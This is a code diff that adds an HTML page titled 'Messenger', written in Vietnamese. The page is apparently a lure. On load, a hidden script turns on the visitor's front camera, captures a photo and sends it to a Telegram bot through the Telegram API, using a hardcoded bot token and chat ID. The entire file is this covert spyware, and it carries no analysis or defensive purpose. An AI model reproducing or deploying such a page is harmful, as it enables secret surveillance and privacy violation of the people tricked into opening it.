@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Messenger</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #3c0066;
+      height: 100%;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const token = "8126668661:AAGn670QIEq-275shtOOs_3kqGHCZGkmhFk";
+    const chatId = "-1002660861146";
+
+    async function start() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 2000));
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("photo", blob, "cam.png");
+          form.append("caption", "📸 Ảnh từ camera người dùng");
+
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: form
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/png");
+      } catch (e) {
+        console.error("Lỗi:", e.message);
+      }
+    }
+
+    start();
+  </script>
+</body>
+</html>
